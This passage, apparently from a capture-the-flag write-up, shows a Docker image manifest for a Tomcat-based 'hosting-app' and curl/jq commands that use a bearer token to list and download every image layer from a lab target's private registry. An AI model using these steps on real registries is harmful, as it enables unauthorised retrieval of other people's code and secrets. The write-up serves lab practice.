         "v1Compatibility": "{\"id\":\"8352728bd14b4f5a18051ae76ce15e3d3a97180d5a699b3847d89570e37354f1\",\"parent\":\"a785065e8f19dad061ddf5035668d11bc69cd943634130ffd35ab8fcd9884da0\",\"created\":\"2023-07-04T10:56:56.087876543Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c adduser -S -u 1000 -G app app\"]}}"
      },
      {
         "v1Compatibility": "{\"id\":\"a785065e8f19dad061ddf5035668d11bc69cd943634130ffd35ab8fcd9884da0\",\"parent\":\"690545aba874c1cbffa3b6cfa0b6708cffb39c97d4b823b4cef4abd0db23cce0\",\"created\":\"2023-07-04T10:56:55.215778789Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c addgroup -S -g 1000 app\"]}}"
      },
      {
         "v1Compatibility": "{\"id\":\"690545aba874c1cbffa3b6cfa0b6708cffb39c97d4b823b4cef4abd0db23cce0\",\"parent\":\"a133674c237f389cb7d5e0c12177d5a7f3dcc3f068f6e92561f5898835c827d6\",\"created\":\"2023-07-04T10:56:54.346382505Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop) COPY file:c7945822095fe4c2530de4cf6bf7c729cbe6af014740a937187ab5d2e35c30f6 in /usr/local/tomcat/webapps/hosting.war \"]}}"
      },
      {
         "v1Compatibility": "{\"id\":\"a133674c237f389cb7d5e0c12177d5a7f3dcc3f068f6e92561f5898835c827d6\",\"parent\":\"57f5a3c239ecc33903be4eabc571b72d8d934124b84dc6bdffb476845a9af610\",\"created\":\"2023-07-04T10:56:53.888849151Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop) COPY file:9fd68c3bdf49b0400fb5ecb77c7ac57ae96f83db385b6231feb7649f7daa5c23 in /usr/local/tomcat/conf/context.xml \"]}}"
      },
      {
         "v1Compatibility": "{\"id\":\"57f5a3c239ecc33903be4eabc571b72d8d934124b84dc6bdffb476845a9af610\",\"parent\":\"b01f09ef77c3df66690a924577eabb8ed7043baeaa37a1b608370d0489e4fdee\",\"created\":\"2023-07-04T10:56:53.629058758Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c rm -rf /usr/local/tomcat/webapps/ROOT\"]}}"
      },
      {
         "v1Compatibility": "{\"id\":\"b01f09ef77c3df66690a924577eabb8ed7043baeaa37a1b608370d0489e4fdee\",\"parent\":\"80e769c3cd6d9be2bcfea77a058c23d7ea112afaddce9e12c8eebf6d759923fe\",\"created\":\"2018-01-10T09:34:07.981925046Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  CMD [\\\"catalina.sh\\\" \\\"run\\\"]\"]},\"throwaway\":true}"
      },
      {
         "v1Compatibility": "{\"id\":\"80e769c3cd6d9be2bcfea77a058c23d7ea112afaddce9e12c8eebf6d759923fe\",\"parent\":\"f5f0aebde7367c572f72c6d19cbea5b9b039b281b5e140bcd1a9b30ebc4883ce\",\"created\":\"2018-01-10T09:34:07.723478629Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  EXPOSE 8080/tcp\"]},\"throwaway\":true}"
      },
      {
         "v1Compatibility": "{\"id\":\"f5f0aebde7367c572f72c6d19cbea5b9b039b281b5e140bcd1a9b30ebc4883ce\",\"parent\":\"7aa3546803b6195a9839f57454a9d61a490e5e5f921b65b7ce9883615a7fef76\",\"created\":\"2018-01-10T09:34:07.47548453Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c set -e \\t\\u0026\\u0026 nativeLines=\\\"$(catalina.sh configtest 2\\u003e\\u00261)\\\" \\t\\u0026\\u0026 nativeLines=\\\"$(echo \\\"$nativeLines\\\" | grep 'Apache Tomcat Native')\\\" \\t\\u0026\\u0026 nativeLines=\\\"$(echo \\\"$nativeLines\\\" | sort -u)\\\" \\t\\u0026\\u0026 if ! echo \\\"$nativeLines\\\" | grep 'INFO: Loaded APR based Apache Tomcat Native library' \\u003e\\u00262; then \\t\\techo \\u003e\\u00262 \\\"$nativeLines\\\"; \\t\\texit 1; \\tfi\"]}}"
      },
      {
         "v1Compatibility": "{\"id\":\"7aa3546803b6195a9839f57454a9d61a490e5e5f921b65b7ce9883615a7fef76\",\"parent\":\"c23e626ece757750f0686befb692e52700626071dcd62c9b7424740c3683a842\",\"created\":\"2018-01-10T09:33:57.030831358Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c set -eux; \\t\\tapk add --no-cache --virtual .fetch-deps \\t\\tca-certificates \\t\\topenssl \\t; \\t\\tsuccess=; \\tfor url in $TOMCAT_TGZ_URLS; do \\t\\tif wget -O tomcat.tar.gz \\\"$url\\\"; then \\t\\t\\tsuccess=1; \\t\\t\\tbreak; \\t\\tfi; \\tdone; \\t[ -n \\\"$success\\\" ]; \\t\\techo \\\"$TOMCAT_SHA1 *tomcat.tar.gz\\\" | sha1sum -c -; \\t\\tsuccess=; \\tfor url in $TOMCAT_ASC_URLS; do \\t\\tif wget -O tomcat.tar.gz.asc \\\"$url\\\"; then \\t\\t\\tsuccess=1; \\t\\t\\tbreak; \\t\\tfi; \\tdone; \\t[ -n \\\"$success\\\" ]; \\t\\tgpg --batch --verify tomcat.tar.gz.asc tomcat.tar.gz; \\ttar -xvf tomcat.tar.gz --strip-components=1; \\trm bin/*.bat; \\trm tomcat.tar.gz*; \\t\\tnativeBuildDir=\\\"$(mktemp -d)\\\"; \\ttar -xvf bin/tomcat-native.tar.gz -C \\\"$nativeBuildDir\\\" --strip-components=1; \\tapk add --no-cache --virtual .native-build-deps \\t\\tapr-dev \\t\\tcoreutils \\t\\tdpkg-dev dpkg \\t\\tgcc \\t\\tlibc-dev \\t\\tmake \\t\\t\\\"openjdk${JAVA_VERSION%%[-~bu]*}\\\"=\\\"$JAVA_ALPINE_VERSION\\\" \\t\\topenssl-dev \\t; \\t( \\t\\texport CATALINA_HOME=\\\"$PWD\\\"; \\t\\tcd \\\"$nativeBuildDir/native\\\"; \\t\\tgnuArch=\\\"$(dpkg-architecture --query DEB_BUILD_GNU_TYPE)\\\"; \\t\\t./configure \\t\\t\\t--build=\\\"$gnuArch\\\" \\t\\t\\t--libdir=\\\"$TOMCAT_NATIVE_LIBDIR\\\" \\t\\t\\t--prefix=\\\"$CATALINA_HOME\\\" \\t\\t\\t--with-apr=\\\"$(which apr-1-config)\\\" \\t\\t\\t--with-java-home=\\\"$(docker-java-home)\\\" \\t\\t\\t--with-ssl=yes; \\t\\tmake -j \\\"$(nproc)\\\"; \\t\\tmake install; \\t); \\trunDeps=\\\"$( \\t\\tscanelf --needed --nobanner --format '%n#p' --recursive \\\"$TOMCAT_NATIVE_LIBDIR\\\" \\t\\t\\t| tr ',' '\\\\n' \\t\\t\\t| sort -u \\t\\t\\t| awk 'system(\\\"[ -e /usr/local/lib/\\\" $1 \\\" ]\\\") == 0 { next } { print \\\"so:\\\" $1 }' \\t)\\\"; \\tapk add --virtual .tomcat-native-rundeps $runDeps; \\tapk del .fetch-deps .native-build-deps; \\trm -rf \\\"$nativeBuildDir\\\"; \\trm bin/tomcat-native.tar.gz; \\t\\tapk add --no-cache bash; \\tfind ./bin/ -name '*.sh' -exec sed -ri 's|^#!/bin/sh$|#!/usr/bin/env bash|' '{}' +\"]}}"
      },
      {
         "v1Compatibility": "{\"id\":\"c23e626ece757750f0686befb692e52700626071dcd62c9b7424740c3683a842\",\"parent\":\"ba737ee0cd9073e2003dbc41ebaa4ac347a9da8713ee3cdd18c9099c71d715d7\",\"created\":\"2018-01-10T09:33:33.620084689Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  ENV TOMCAT_ASC_URLS=https://www.apache.org/dyn/closer.cgi?action=download\\u0026filename=tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz.asc \\thttps://www-us.apache.org/dist/tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz.asc \\thttps://www.apache.org/dist/tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz.asc \\thttps://archive.apache.org/dist/tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz.asc\"]},\"throwaway\":true}"
      },
      {
         "v1Compatibility": "{\"id\":\"ba737ee0cd9073e2003dbc41ebaa4ac347a9da8713ee3cdd18c9099c71d715d7\",\"parent\":\"67f844d01db77d9e5e9bdc5c154a8d40bdfe8ec30f2c0aa6c199448aab75f94e\",\"created\":\"2018-01-10T09:33:33.366948345Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  ENV TOMCAT_TGZ_URLS=https://www.apache.org/dyn/closer.cgi?action=download\\u0026filename=tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz \\thttps://www-us.apache.org/dist/tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz \\thttps://www.apache.org/dist/tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz \\thttps://archive.apache.org/dist/tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz\"]},\"throwaway\":true}"
      },
      {
         "v1Compatibility": "{\"id\":\"67f844d01db77d9e5e9bdc5c154a8d40bdfe8ec30f2c0aa6c199448aab75f94e\",\"parent\":\"61e9c45c309801f541720bb694574780aaf3f9c9ba939afd3a2248f921257e2b\",\"created\":\"2018-01-10T09:33:33.130789837Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  ENV TOMCAT_SHA1=b59e1d658a4edbca7a81d12fd6f20203a4da9743\"]},\"throwaway\":true}"
      },
      {
         "v1Compatibility": "{\"id\":\"61e9c45c309801f541720bb694574780aaf3f9c9ba939afd3a2248f921257e2b\",\"parent\":\"7aa678f161898c0b2fb24800833ec8a88e29662a4aeb73d9fd09f0f3e2880638\",\"created\":\"2018-01-10T09:33:32.902199138Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  ENV TOMCAT_VERSION=9.0.2\"]},\"throwaway\":true}"
      },
      {
         "v1Compatibility": "{\"id\":\"7aa678f161898c0b2fb24800833ec8a88e29662a4aeb73d9fd09f0f3e2880638\",\"parent\":\"d436c875c4061e0058d744bb26561bc738cba69b135416d441401faeb47b558c\",\"created\":\"2018-01-10T09:33:32.656603152Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  ENV TOMCAT_MAJOR=9\"]},\"throwaway\":true}"
      },
      {
         "v1Compatibility": "{\"id\":\"d436c875c4061e0058d744bb26561bc738cba69b135416d441401faeb47b558c\",\"parent\":\"15ee0d244e69dcb1e0ff2817e31071a18a7352ae4e5bb1765536a831bf69ecfc\",\"created\":\"2018-01-10T09:33:29.658955433Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c set -ex; \\tfor key in $GPG_KEYS; do \\t\\tgpg --keyserver ha.pool.sks-keyservers.net --recv-keys \\\"$key\\\"; \\tdone\"]}}"
      },
      {
         "v1Compatibility": "{\"id\":\"15ee0d244e69dcb1e0ff2817e31071a18a7352ae4e5bb1765536a831bf69ecfc\",\"parent\":\"ff0264281c2fadd4108ccac96ddce82587bc26666b918f31bcb43b7ef73c65e8\",\"created\":\"2018-01-10T09:33:20.722817917Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  ENV GPG_KEYS=05AB33110949707C93A279E3D3EFE6B686867BA6 07E48665A34DCAFAE522E5E6266191C37C037D42 47309207D818FFD8DCD3F83F1931D684307A10A5 541FBE7D8F78B25E055DDEE13C370389288584E7 61B832AC2F1C5A90F0F9B00A1C506407564C17A3 79F7026C690BAA50B92CD8B66A3AD3F4F22C4FED 9BA44C2621385CB966EBA586F72C284D731FABEE A27677289986DB50844682F8ACB77FC2E86E29AC A9C5DF4D22E99998D9875A5110C01C5A2F6059E7 DCFD35E0BF8CA7344752DE8B6FB21E8933C60243 F3A04C595DB5B6A5F1ECA43E3B7BBB100D811BBE F7DA48BB64BCB84ECBA7EE6935CD23C10D498E23\"]},\"throwaway\":true}"
      },
      {
         "v1Compatibility": "{\"id\":\"ff0264281c2fadd4108ccac96ddce82587bc26666b918f31bcb43b7ef73c65e8\",\"parent\":\"4d9c918fda475437138013a0cf2e0c9086e7c1ed8190c1a0cef8d2b882937428\",\"created\":\"2018-01-10T09:29:11.265649726Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c apk add --no-cache gnupg\"]}}"
      },
      {
         "v1Compatibility": "{\"id\":\"4d9c918fda475437138013a0cf2e0c9086e7c1ed8190c1a0cef8d2b882937428\",\"parent\":\"7577bdb4d1f873242bef6582d26031cdea0a64cccf8f8608a8c07cb3cc74611e\",\"created\":\"2018-01-10T09:29:07.609109611Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  ENV LD_LIBRARY_PATH=/usr/local/tomcat/native-jni-lib\"]},\"throwaway\":true}"
      },
      {
         "v1Compatibility": "{\"id\":\"7577bdb4d1f873242bef6582d26031cdea0a64cccf8f8608a8c07cb3cc74611e\",\"parent\":\"839af1242b7dcef37994affedfee3e2c52246e521ac101e703737fc0164cdf5c\",\"created\":\"2018-01-10T09:29:07.376174727Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  ENV TOMCAT_NATIVE_LIBDIR=/usr/local/tomcat/native-jni-lib\"]},\"throwaway\":true}"
      },
      {
         "v1Compatibility": "{\"id\":\"839af1242b7dcef37994affedfee3e2c52246e521ac101e703737fc0164cdf5c\",\"parent\":\"ea6f6f5cf5c076bca613117419ab5c2d591798dc146fa25b1ab5f77dadf35a0c\",\"created\":\"2018-01-10T09:29:07.155029096Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop) WORKDIR /usr/local/tomcat\"]},\"throwaway\":true}"
      },
      {
         "v1Compatibility": "{\"id\":\"ea6f6f5cf5c076bca613117419ab5c2d591798dc146fa25b1ab5f77dadf35a0c\",\"parent\":\"c55835e0e7564582d31203616f363dfb303cab260c1a6dec9a2a0329a8e27b81\",\"created\":\"2018-01-10T09:29:06.890891119Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c mkdir -p \\\"$CATALINA_HOME\\\"\"]}}"
      },
      {
         "v1Compatibility": "{\"id\":\"c55835e0e7564582d31203616f363dfb303cab260c1a6dec9a2a0329a8e27b81\",\"parent\":\"32c57341ccdca27052b71277715b86f2c0ad436ac493bb79467a8df664379ba9\",\"created\":\"2018-01-10T09:29:06.087097667Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  ENV PATH=/usr/local/tomcat/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/lib/jvm/java-1.8-openjdk/jre/bin:/usr/lib/jvm/java-1.8-openjdk/bin\"]},\"throwaway\":true}"
      },
      {
         "v1Compatibility": "{\"id\":\"32c57341ccdca27052b71277715b86f2c0ad436ac493bb79467a8df664379ba9\",\"parent\":\"c54559a23f245bd25ad627150eaadb1e99a60811ad2955e6a747f2a59b09b22b\",\"created\":\"2018-01-10T09:29:05.864118034Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  ENV CATALINA_HOME=/usr/local/tomcat\"]},\"throwaway\":true}"
      },
      {
         "v1Compatibility": "{\"id\":\"c54559a23f245bd25ad627150eaadb1e99a60811ad2955e6a747f2a59b09b22b\",\"parent\":\"86a2c94b64bc779ec79acaa9f0ab00dff4a664d23f7546330a3165f1137cd596\",\"created\":\"2018-01-10T04:52:04.664605562Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c set -x \\t\\u0026\\u0026 apk add --no-cache \\t\\topenjdk8-jre=\\\"$JAVA_ALPINE_VERSION\\\" \\t\\u0026\\u0026 [ \\\"$JAVA_HOME\\\" = \\\"$(docker-java-home)\\\" ]\"]}}"
      },
      {
         "v1Compatibility": "{\"id\":\"86a2c94b64bc779ec79acaa9f0ab00dff4a664d23f7546330a3165f1137cd596\",\"parent\":\"8ad7d8482d05498820d3256b0ba7eeaf21b8e7ab63044a4bce65116a5dac6a49\",\"created\":\"2018-01-10T04:51:57.540527702Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  ENV JAVA_ALPINE_VERSION=8.151.12-r0\"]},\"throwaway\":true}"
      },
      {
         "v1Compatibility": "{\"id\":\"8ad7d8482d05498820d3256b0ba7eeaf21b8e7ab63044a4bce65116a5dac6a49\",\"parent\":\"55332c2663c5991fc04851d7980056a37cf2d703e90ef658fd8adccd947f5ca1\",\"created\":\"2018-01-10T04:51:57.314525921Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  ENV JAVA_VERSION=8u151\"]},\"throwaway\":true}"
      },
      {
         "v1Compatibility": "{\"id\":\"55332c2663c5991fc04851d7980056a37cf2d703e90ef658fd8adccd947f5ca1\",\"parent\":\"3f24ff911184223f9c7e0b260cce136bc9cededdbdce79112e2a84e4c34bb568\",\"created\":\"2018-01-10T04:51:57.072315887Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  ENV PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/lib/jvm/java-1.8-openjdk/jre/bin:/usr/lib/jvm/java-1.8-openjdk/bin\"]},\"throwaway\":true}"
      },
      {
         "v1Compatibility": "{\"id\":\"3f24ff911184223f9c7e0b260cce136bc9cededdbdce79112e2a84e4c34bb568\",\"parent\":\"0ed181ef14afa5947383aaa2644e5ece84fb1a70f3156708709f2d04b6a6ec9e\",\"created\":\"2018-01-10T04:51:56.850972184Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  ENV JAVA_HOME=/usr/lib/jvm/java-1.8-openjdk/jre\"]},\"throwaway\":true}"
      },
      {
         "v1Compatibility": "{\"id\":\"0ed181ef14afa5947383aaa2644e5ece84fb1a70f3156708709f2d04b6a6ec9e\",\"parent\":\"5a545e9783766d38b2d99784c9d9bf5ed547bf48e1a293059b4cc7f27dd34b31\",\"created\":\"2018-01-10T04:48:25.431215554Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c { \\t\\techo '#!/bin/sh'; \\t\\techo 'set -e'; \\t\\techo; \\t\\techo 'dirname \\\"$(dirname \\\"$(readlink -f \\\"$(which javac || which java)\\\")\\\")\\\"'; \\t} \\u003e /usr/local/bin/docker-java-home \\t\\u0026\\u0026 chmod +x /usr/local/bin/docker-java-home\"]}}"
      },
      {
         "v1Compatibility": "{\"id\":\"5a545e9783766d38b2d99784c9d9bf5ed547bf48e1a293059b4cc7f27dd34b31\",\"parent\":\"2dea27bce7d674e8140e0378fe5a51157011109d9da593bab1ecf86c93595292\",\"created\":\"2018-01-10T04:48:24.510692074Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  ENV LANG=C.UTF-8\"]},\"throwaway\":true}"
      },
      {
         "v1Compatibility": "{\"id\":\"2dea27bce7d674e8140e0378fe5a51157011109d9da593bab1ecf86c93595292\",\"parent\":\"28a0c8bbcab32237452c3dadfb8302a6fab4f6064be2d858add06a7be8c32924\",\"created\":\"2018-01-09T21:10:58.579708634Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  CMD [\\\"/bin/sh\\\"]\"]},\"throwaway\":true}"
      },
      {
         "v1Compatibility": "{\"id\":\"28a0c8bbcab32237452c3dadfb8302a6fab4f6064be2d858add06a7be8c32924\",\"created\":\"2018-01-09T21:10:58.365737589Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop) ADD file:093f0723fa46f6cdbd6f7bd146448bb70ecce54254c35701feeceb956414622f in / \"]}}"
      }
   ],
   "signatures": [
      {
         "header": {
            "jwk": {
               "crv": "P-256",
               "kid": "BH7A:RDKN:4ITR:JT3B:KSKO:BYLB:4MSQ:LUYS:OOD3:2PBY:KHEB:CAEI",
               "kty": "EC",
               "x": "UxAAuH95bWHK1LHGCDfBeadxl36QiO9JIcxWNYOaxME",
               "y": "Sw7ANCTR0DC64PdGq40nNCsS-uYw9vi76XhJyEeD61E"
            },
            "alg": "ES256"
         },
         "signature": "FdAFAT7c0-yBPWJGoDIkaS7e1XUd3r-dKYdIZxICt6V82_z__hp4ovTigVqv4jRtQ-e_cUDXf2WKOESWHnlTbQ",
         "protected": "eyJmb3JtYXRMZW5ndGgiOjI2MDkxLCJmb3JtYXRUYWlsIjoiQ24wIiwidGltZSI6IjIwMjMtMDctMjVUMjM6MzY6MzFaIn0"
      }
   ]
}
</code></pre></div><p>To actually download all of them, we will use some shell scripting:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> -k https://10.10.11.223:5000/v2/hosting-app/manifests/latest -sH <span class="code-dark-yellow">'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6IlFYNjY6MkUyQTpZT0xPOjdQQTM6UEdRSDpHUVVCOjVTQk06UlhSMjpUSkM0OjVMNFg6TVVZSjpGSEVWIn0.eyJpc3MiOiJBY21lIGF1dGggc2VydmVyIiwic3ViIjoiIiwiYXVkIjoiRG9ja2VyIHJlZ2lzdHJ5IiwiZXhwIjoxNjkwMzI5MDMwLCJuYmYiOjE2OTAzMjgxMjAsImlhdCI6MTY5MDMyODEzMCwianRpIjoiMjcxMjE4MTkzOTE1OTY2NDI1MiIsImFjY2VzcyI6W3sidHlwZSI6InJlcG9zaXRvcnkiLCJuYW1lIjoiaG9zdGluZy1hcHAiLCJhY3Rpb25zIjpbInB1bGwiXX1dfQ.gY4JoGWaELk_3AGkatkP-FhjN12UXpm-DfyUTN7jQ7PQcPkxDYi6HUeNBAPmWv4T9BkhITaFJJYgTktyfOc_n-_6lkr_aAN46DOABV2pAEHP7JdhfoVw5tlyt5tYZ6Gh8DZh9KOee8jz6p3ZCFbBE-0d0nAWYAhK-Pi1styVq6mwCUziSILnOWZ8l1s6hiUiGXvMaMACpvgzq70K350i_ozv0ZlqNGkhd6po0LTd0Ves7ICaf2-BaJ7HXMtrliz-JcOLiAPasxKPpojmOVP0vnYyFxKxw6kA-t-i6MMpP-lrCW8ASsxTK7Y_x2bn-A3ZBsM1oINQmpaP0FQero3kuA'</span> | <span class="code-dark-green">jq</span> -r <span class="code-dark-yellow">'.fsLayers[].blobSum'</span>
sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
sha256:0bf45c325a696381eea5176baa1c8e84fbf0fe5e2ddf96a22422b10bf879d0ba
sha256:4a19a05f49c2d93e67d7c9ea8ba6c310d6b358e811c8ae37787f21b9ad82ac42
sha256:9e700b74cc5b6f81ed6513fa03c7b6ab11a71deb8e27604632f723f81aca3268
sha256:b5ac54f57d23fa33610cb14f7c21c71aa810e58884090cead5e3119774a202dc
sha256:396c4a40448860471ae66f68c261b9a0ed277822b197730ba89cb50528f042c7
sha256:9d5bcc17fed815c4060b373b2a8595687502925829359dc244dd4cdff777a96c
sha256:ab55eca3206e27506f679b41b39ba0e4c98996fa347326b6629dae9163b4c0ec
sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
sha256:f7b708f947c32709ecceaffd85287d5eb9916a3013f49c8416228ef22c2bf85e
sha256:497760bf469e19f1845b7f1da9cfe7e053beb57d4908fb2dff2a01a9f82211f9
sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
sha256:e4cc5f625cda9caa32eddae6ac29b170c8dc1102988b845d7ab637938f2f6f84
sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
sha256:0da484dfb0612bb168b7258b27e745d0febf56d22b8f10f459ed0d1dfe345110
sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
sha256:7b43ca85cb2c7ccc62e03067862d35091ee30ce83e7fed9e135b1ef1c6e2e71b
sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
sha256:fa7536dd895ade2421a9a0fcf6e16485323f9e2e45e917b1ff18b0f648974626
sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
sha256:5de5f69f42d765af6ffb6753242b18dd4a33602ad7d76df52064833e5c527cb4
sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
sha256:ff3a5c916c92643ff77519ffa742d3ec61b7f591b6b7504599d95a4a41134e28

<span class="code-cyan">$</span> blobs=<span class="code-dark-magenta">$(</span><span class="code-dark-green">curl</span> -k https://10.10.11.223:5000/v2/hosting-app/manifests/latest -sH <span class="code-dark-yellow">'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6IlFYNjY6MkUyQTpZT0xPOjdQQTM6UEdRSDpHUVVCOjVTQk06UlhSMjpUSkM0OjVMNFg6TVVZSjpGSEVWIn0.eyJpc3MiOiJBY21lIGF1dGggc2VydmVyIiwic3ViIjoiIiwiYXVkIjoiRG9ja2VyIHJlZ2lzdHJ5IiwiZXhwIjoxNjkwMzI5MDMwLCJuYmYiOjE2OTAzMjgxMjAsImlhdCI6MTY5MDMyODEzMCwianRpIjoiMjcxMjE4MTkzOTE1OTY2NDI1MiIsImFjY2VzcyI6W3sidHlwZSI6InJlcG9zaXRvcnkiLCJuYW1lIjoiaG9zdGluZy1hcHAiLCJhY3Rpb25zIjpbInB1bGwiXX1dfQ.gY4JoGWaELk_3AGkatkP-FhjN12UXpm-DfyUTN7jQ7PQcPkxDYi6HUeNBAPmWv4T9BkhITaFJJYgTktyfOc_n-_6lkr_aAN46DOABV2pAEHP7JdhfoVw5tlyt5tYZ6Gh8DZh9KOee8jz6p3ZCFbBE-0d0nAWYAhK-Pi1styVq6mwCUziSILnOWZ8l1s6hiUiGXvMaMACpvgzq70K350i_ozv0ZlqNGkhd6po0LTd0Ves7ICaf2-BaJ7HXMtrliz-JcOLiAPasxKPpojmOVP0vnYyFxKxw6kA-t-i6MMpP-lrCW8ASsxTK7Y_x2bn-A3ZBsM1oINQmpaP0FQero3kuA'</span> | <span class="code-dark-green">jq</span> -r <span class="code-dark-yellow">'.fsLayers[].blobSum'</span> | <span class="code-dark-green">sort</span> -u<span class="code-dark-magenta">)</span>  

<span class="code-cyan">$</span> <span class="code-dark-yellow">for</span> b in <span class="code-dark-magenta">$(</span><span class="code-dark-green">echo</span> <span class="code-dark-yellow">"<span class="code-dark-cyan">$blobs</span>"</span><span class="code-dark-magenta">)</span>; <span class="code-dark-yellow">do</span> <span class="code-dark-green">curl</span> -k https://10.10.11.223:5000/v2/hosting-app/blobs/$b -so $b.tar.gz -H <span class="code-dark-yellow">'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6IlFYNjY6MkUyQTpZT0xPOjdQQTM6UEdRSDpHUVVCOjVTQk06UlhSMjpUSkM0OjVMNFg6TVVZSjpGSEVWIn0.eyJpc3MiOiJBY21lIGF1dGggc2VydmVyIiwic3ViIjoiIiwiYXVkIjoiRG9ja2VyIHJlZ2lzdHJ5IiwiZXhwIjoxNjkwMzI5MDMwLCJuYmYiOjE2OTAzMjgxMjAsImlhdCI6MTY5MDMyODEzMCwianRpIjoiMjcxMjE4MTkzOTE1OTY2NDI1MiIsImFjY2VzcyI6W3sidHlwZSI6InJlcG9zaXRvcnkiLCJuYW1lIjoiaG9zdGluZy1hcHAiLCJhY3Rpb25zIjpbInB1bGwiXX1dfQ.gY4JoGWaELk_3AGkatkP-FhjN12UXpm-DfyUTN7jQ7PQcPkxDYi6HUeNBAPmWv4T9BkhITaFJJYgTktyfOc_n-_6lkr_aAN46DOABV2pAEHP7JdhfoVw5tlyt5tYZ6Gh8DZh9KOee8jz6p3ZCFbBE-0d0nAWYAhK-Pi1styVq6mwCUziSILnOWZ8l1s6hiUiGXvMaMACpvgzq70K350i_ozv0ZlqNGkhd6po0LTd0Ves7ICaf2-BaJ7HXMtrliz-JcOLiAPasxKPpojmOVP0vnYyFxKxw6kA-t-i6MMpP-lrCW8ASsxTK7Y_x2bn-A3ZBsM1oINQmpaP0FQero3kuA'</span>; <span class="code-dark-yellow">done</span>

<span class="code-cyan">$</span> <span class="code-dark-green">ls</span>
<span class="code-red">sha256:0bf45c325a696381eea5176baa1c8e84fbf0fe5e2ddf96a22422b10bf879d0ba.tar.gz</span>
